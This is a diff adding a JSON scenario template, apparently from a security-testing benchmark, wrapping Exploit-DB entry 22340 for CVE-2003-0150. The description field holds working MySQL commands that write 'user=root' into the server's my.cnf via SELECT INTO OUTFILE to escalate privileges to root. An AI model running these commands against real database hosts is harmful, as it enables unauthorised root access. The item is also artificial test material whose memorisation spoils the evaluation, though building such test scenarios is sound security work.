@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_22340",
+  "category": "D3_database",
+  "attack_technique": "T1078.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: MySQL 3.23.x - 'mysqld' Local Privilege Escalation (CVE-2003-0150;OSVDB-9909)\n\nExploit source code (22340.txt):\n```\nsource: https://www.securityfocus.com/bid/7052/info\n\nA vulnerability has been discovered for MySQL that may allow the mysqld service to start with elevated privileges.\n\nAn attacker can exploit this vulnerability by creating a DATADIR/my.cnf that includes the line 'user=root' under the '[mysqld]' option section.\n\nWhen the mysqld service is executed, it will run as the root user instead of the default user.\n\nThis may allow an attacker to obtain elevated privileges on a compromised system.\n\nmysql>CREATE DATABASE roottext;\nmysql>USE roottext;\nmysql>CREATE TABLE hack (conf VARCHAR(80));\nmysql>INSERT IN hack VALUES ('[mysqld]');\nmysql>INSERT IN hack VALUES ('user=root');\nmysql>SELECT * INTO OUTFILE '/path/to/mysql/datadir/my.cnf' FROM hack\nmysql>QUIT\n```",
+  "cve": "CVE-2003-0150;OSVDB-9909",
+  "exploitdb_id": "22340",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_22340",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
